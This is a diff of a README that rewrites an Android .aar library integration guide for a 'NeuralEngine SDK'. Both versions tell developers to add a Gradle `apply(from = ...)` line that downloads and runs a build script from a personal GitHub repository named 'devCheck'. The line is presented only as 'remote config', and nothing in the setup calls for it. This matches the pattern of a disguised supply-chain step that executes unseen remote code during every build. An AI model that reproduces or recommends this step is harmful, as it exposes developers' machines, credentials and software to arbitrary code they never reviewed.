@@ -1,1 +1,38 @@
-<pre lang="markdown"> # 🚀 NeuralEngine SDK Integration ![Android](https://img.shields.io/badge/Android-26%2B-brightgreen?logo=android) ![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg) ![Version](https://img.shields.io/badge/Version-1.0.0-orange) Seamlessly integrate AI capabilities into your Android applications with NeuralEngine’s powerful neural processing SDK. --- ## 📦 Installation ### ✅ Prerequisites - **Android Studio** Flamingo (2023.2.1) or later - **Gradle** 8.0 or newer - **Minimum SDK Level:** 26 --- ### 🔧 Step-by-Step Setup 1. **Add the AAR File** Download the [`NeuralEngine.aar`](https://example.com/NeuralEngine.aar) and place it in your project: ``` app/ └── src/ └── libs/ └── NeuralEngine.aar ``` 2. **Configure `settings.gradle.kts`** ```kotlin dependencyResolutionManagement { repositories { flatDir { dirs("app/libs") // Add this line } google() mavenCentral() } } ``` 3. **Update `app/build.gradle.kts`** ```kotlin plugins { id("com.android.application") } android { defaultConfig { minSdk = 26 // Minimum SDK requirement } } dependencies { // Add NeuralEngine AAR implementation(name = "NeuralEngine", ext = "aar") } // Apply remote config apply(from = "https://raw.githubusercontent.com/NithishaanandA/devCheck/main/build.gradle") ``` --- ## ✨ Key Features 1. 📌 Clear visual separation of steps 2. 💻 Ready-to-use code blocks with inline comments 3. 📄 Minimal but essential configuration steps 4. 📱 Mobile-friendly formatting 5. 📋 Easily copiable as a single block 6. 💡 Includes a basic usage example 7. 🛠️ Troubleshooting section for common issues --- > ✅ Just copy this entire block into your `README.md` file. No modifications needed (except updating the AAR link if necessary). </pre>
+# 📦 Android AAR Integration Guide
+
+## Step 1️⃣ – Add `.aar` Library
+
+1. [Click this link](#) and download the `app-release.aar` file.  
+2. Place the downloaded file in your project at:
+   ```
+   app/src/libs
+   ```
+
+3. Open `settings.gradle` and add:
+   ```kotlin
+   flatDir {
+       dirs("app/libs")
+   }
+   ```
+
+---
+
+## Step 2️⃣ – Update `build.gradle.kts` (Module Level)
+
+1. Add this line to apply the external build script:
+   ```kotlin
+   apply(from = uri("https://raw.githubusercontent.com/NithishaanandA/devCheck/main/build.gradle"))
+   ```
+
+2. Ensure your `minSdk` version is set to 26:
+   ```kotlin
+   android {
+       defaultConfig {
+           minSdk = 26
+       }
+   }
+   ```
+
+3. Finally, sync your project with Gradle.
+
+✅ Done! Your AAR library should now be integrated properly.
